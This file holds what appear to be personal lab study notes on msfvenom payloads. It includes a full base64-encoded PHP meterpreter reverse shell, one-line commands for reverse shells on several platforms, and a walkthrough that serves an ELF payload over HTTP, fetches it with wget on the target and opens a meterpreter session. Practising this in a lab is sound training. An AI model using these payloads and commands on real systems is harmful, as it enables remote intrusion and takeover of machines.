@@ -1,0 +1,161 @@
+
+
+#### What is MSFVENOM? ####
+
+- Metasploit framework used to generate, encode, and customize payloads
+
+
+#### What is the purpose of Encoders? ####
+
+- Encoders are meant to obfsucate the signature of the payload.
+
+    - They put the shell code into a different format to avoid Anti-Virus(AV) detection.
+        - They alter signature patterns, remove "bad characters" (e.g., null bytes \x00) that can break exploits, 
+        and ensure payload stability.
+
+#### How to view available MSFVENOM Payloads ####
+
+- root@ip-10-10-186-44:~# msfvenom -l payloads 
+
+Framework Payloads (562 total) [--payload ]
+
+                    or
+
+- msfvenom --list formats
+
+
+#### Generating a encoded Payload ####
+
+- msfvenom -p php/meterpreter/reverse_tcp LHOST=10.66.110.10 -f raw -e php/base64
+[*] exec: msfvenom -p php/meterpreter/reverse_tcp LHOST=10.66.110.10 -f raw -e php/base64
+
+OUTPUT: (
+
+Found 1 compatible encoders
+
+Attempting to encode payload with 1 iterations of php/base64
+php/base64 succeeded with size 1507 (iteration=0)
+php/base64 chosen with final size 1507
+Payload size: 1507 bytes
+eval(base64_decode(Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzEwLjY2LjExMC4xMCc7ICRwb3J0ID0gNDQ0NDsgaWYgKCgkZiA9ICdzdHJlYW1fc29ja2V0X2NsaWVudCcpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCJ0Y3A6Ly97JGlwfTp7JHBvcnR9Iik7ICRzX3R5cGUgPSAnc3RyZWFtJzsgfSBpZiAoISRzICYmICgkZiA9ICdmc29ja29wZW4nKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigkaXAsICRwb3J0KTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMgJiYgKCRmID0gJ3NvY2tld
+F9jcmVhdGUnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZihBRl9JTkVULCBTT0NLX1NUUkVBTSwgU09MX1RDUCk7ICRyZXMgPSBAc29ja2V0X2Nvbm5lY3QoJHMsICRpcCwgJHBvcnQpOyBpZiAoISRyZXMpIHsgZGllKCk7IH0gJHNfdHlwZSA9ICdzb2NrZXQnOyB9IGlmICghJHNfdHlwZSkgeyBkaWUoJ25vIHNvY2tldCBmdW5jcycpOyB9IGlmICghJHMpIHsgZGllKCdubyBzb2NrZXQnKTsgfSBzd2l0Y2ggKCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogJGxlbiA9IGZyZWFkKCRzLCA0KTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRsZW4gPS
+Bzb2NrZXRfcmVhZCgkcywgNCk7IGJyZWFrOyB9IGlmICghJGxlbikgeyBkaWUoKTsgfSAkYSA9IHVucGFjaygi.TmxlbiIsICRsZW4pOyAkbGVuID0gJGFbJ2xlbiddOyAkYiA9ICcnOyB3aGlsZSAoc3RybGVuKCRiKSA8ICRsZW4pIHsgc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRiIC49IGZyZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgY2FzZSAnc29ja2V0JzogJGIgLj0gc29ja2V0X3JlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOyB9IH0gJEdMT0JBTFNbJ21zZ3NvY2snXSA9ICRzOyAkR0xPQkFMU1snbXN
+nc29ja190eXBlJ10gPSAkc190eXBlOyBpZiAoZXh0ZW5zaW9uX2xvYWRlZCgnc3Vob3NpbicpICYmIGluaV9nZXQoJ3N1aG9zaW4uZXhlY3V0b3IuZGlzYWJsZV9ldmFs
+JykpIHsgJHN1aG9zaW5fYnlwYXNzPWNyZWF0ZV9mdW5jdGlvbignJywgJGIpOyAkc3Vob3Npbl9ieXBhc3MoKTsgfSBlbHNlIHsgZXZhbCgkYik7IH0gZGllKCk7));
+
+)
+
+#### Catching call backs from the encoded payload generated ####
+
+- Here we use a handler, a handler is just a way of accepting incoming connections.
+    - This will allow your payload to call back to either merterpreter or the rev shell you generated.
+
+        - use exploit/multi/handler 
+
+      - This will be our most commonly used handler, it supports all payloads and can be used by rev shells or merterpreter.
+
+#### Here is a list of formats for payloads ####
+
+- Windows:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
+
+- PHP:
+msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
+
+- ASP:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
+
+- Python:
+msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
+
+PRACTICAL EXAMPLE (Get a shell on a victim machine)
+
+- STEP 1: Generate a payload
+    - Our victim is a linux machine so we will be using a .elf format.
+
+┌──(root㉿kali)-[~]
+└─# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.65.108.139 LPORT=9000 -f elf > rev_shell.elf 
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 123 bytes
+Final size of elf file: 207 bytes
+
+- STEP 2: Start our Python Http.Server
+    ┌──(root㉿kali)-[~]
+└─# python3 -m http.server 9000
+Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
+
+- STEP 3: Download the payload on your victim machine.
+  - wget http://10.65.108.139:9000/rev_shell.elf
+    - Verification from our python server,
+    ──(root㉿kali)-[~]
+└─# sudo python3 -m http.server 9000
+Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
+10.65.155.160 - - [09/Mar/2026 00:13:10] "GET /rev_shell.elf HTTP/1.1" 200 -
+
+- STEP 4: Make the payload executable on our victim machine
+
+root@ip-10-65-155-160:/# chmod +x rev_shell.elf
+root@ip-10-65-155-160:/# ls
+bin   home            lib64       opt            run   sys  vmlinuz
+boot  initrd.img      lost+found  proc           sbin  tmp  vmlinuz.old
+dev   initrd.img.old  media       rev_shell.elf  snap  usr
+etc   lib             mnt         root           srv   var
+
+NOTE: I went to go run my payload here and ran into the following issue,
+
+ISSUE: root@ip-10-65-155-160:/# ./rev_shell.elf
+Segmentation fault (core dumped)
+
+- After looking into this issue, it appears the architechture of the payload is incorrect, libs are missing, or other.
+
+  - Started by checking the architecture of the victim machine,
+
+  $ lscpu
+Architecture:                         x86_64
+CPU op-mode(s):                       32-bit, 64-bit
+Byte Order:                           Little Endian
+Address sizes:                        46 bits physical, 48 bits is virtual
+
+- The payload was encoded in x86_ not the issue.
+
+$ ldd ./rev_shell.elf
+        not a dynamic executable
+
+- Not concerning.
+
+$ file ./rev_shell.elf
+./rev_shell.elf: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, no section header
+
+Accidentally encoded it in x86_32.... oops!
+
+- Created a new payload and started the process over again,
+
+──(root㉿kali)-[~]
+└─# msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.65.108.139 LPORT=9000 -f elf > rev_shell2.elf
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 130 bytes
+Final size of elf file: 250 bytes
+
+- This also did not fix the issue, going to save some time pasting all the logs.
+    - From research I figured out the staged payload is unreliable.
+        - I ended up using the stageless version of it and it worked.
+        
+        ┌──(root㉿kali)-[~]
+└─# msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.65.108.139 LPORT=9000 -f elf > rev_shell3.elf 
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 1068640 bytes
+Final size of elf file: 1068640 bytes
+
+    - Another problem everytime I switch attack boxes my session closes cause the VM basically resets.
+    [*] Meterpreter session 7 opened (10.65.108.139:9000 -> 10.65.155.160:38586)
+meterpreter >
+[*] Meterpreter session 7 closed. Reason: Died
+
+
+
